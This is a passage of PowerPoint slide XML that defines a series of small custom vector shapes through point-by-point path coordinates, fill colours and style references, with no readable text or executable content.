                <a:lnTo>
                  <a:pt x="14" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="66"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="66"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="65"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="65"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="64"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="62"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="61"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="59"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="2"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="bce5e5"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="675" name="CustomShape 291"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3551400" y="3564000"/>
            <a:ext cx="21600" cy="70560"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="14" h="45">
                <a:moveTo>
                  <a:pt x="14" y="1"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="14" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="45"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="45"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="45"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="44"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="44"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="43"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="42"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="41"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="1"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="d1f2f2"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="676" name="CustomShape 292"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3554280" y="3564000"/>
            <a:ext cx="13680" cy="42120"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="9" h="27">
                <a:moveTo>
                  <a:pt x="9" y="1"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="9" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="25"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="24"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="23"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="1"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="e5ffff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="677" name="CustomShape 293"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3728880" y="3686040"/>
            <a:ext cx="21600" cy="21600"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="14" h="14">
                <a:moveTo>
                  <a:pt x="7" y="14"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="9" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="14"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="ffffff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="678" name="CustomShape 294"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3665520" y="3686040"/>
            <a:ext cx="10440" cy="10440"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="7" h="7">
                <a:moveTo>
                  <a:pt x="3" y="7"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="4" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="7"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="ffffff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="679" name="CustomShape 295"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3683160" y="3686040"/>
            <a:ext cx="8640" cy="10440"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="6" h="7">
                <a:moveTo>
                  <a:pt x="4" y="7"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="5" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="7"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="ffffff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="680" name="CustomShape 296"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3611520" y="3538440"/>
            <a:ext cx="27720" cy="146880"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="18" h="93">
                <a:moveTo>
                  <a:pt x="6" y="2"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="6" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="17"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="41"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="58"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="74"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="93"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="93"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17" y="89"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="82"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="71"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="58"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="43"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="2"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="3f9eff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="681" name="CustomShape 297"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3767040" y="3521160"/>
            <a:ext cx="42120" cy="164520"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="27" h="104">
                <a:moveTo>
                  <a:pt x="27" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="25" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="24" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="22" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="20" y="18"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17" y="31"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="49"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17" y="73"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="20" y="104"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="104"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="92"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="79"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="64"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="47"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="30"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="27" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="3f9eff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="682" name="CustomShape 298"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3611520" y="3546360"/>
            <a:ext cx="26280" cy="129600"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="17" h="82">
                <a:moveTo>
                  <a:pt x="6" y="2"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="6" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="38"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="50"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="66"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="82"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="81"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="78"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="73"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="62"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="50"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="38"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="25"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="2"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="59b2ff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="683" name="CustomShape 299"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3613320" y="3556080"/>
            <a:ext cx="21600" cy="108720"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="14" h="69">
                <a:moveTo>
                  <a:pt x="5" y="1"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="5" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="21"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="43"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="56"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="69"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="69"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="67"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="61"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="53"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="43"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="20"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="1"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="72c6ff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="684" name="CustomShape 300"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3614760" y="3565440"/>
            <a:ext cx="18360" cy="89640"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="12" h="57">
                <a:moveTo>
                  <a:pt x="4" y="1"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="2" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="17"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="35"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="45"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="57"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="56"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="55"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="50"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="43"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="35"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="16"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="1"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="8cd8ff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="685" name="CustomShape 301"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3614760" y="3573360"/>
            <a:ext cx="13680" cy="70560"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="9" h="45">
                <a:moveTo>
                  <a:pt x="4" y="1"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="2" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="21"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="37"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="45"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="45"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="44"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="40"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="35"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="21"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="1"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="a5edff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="686" name="CustomShape 302"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3616200" y="3581280"/>
            <a:ext cx="10440" cy="53280"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="7" h="34">
                <a:moveTo>
                  <a:pt x="3" y="2"/>
                </a:moveTo>
                <a:lnTo>
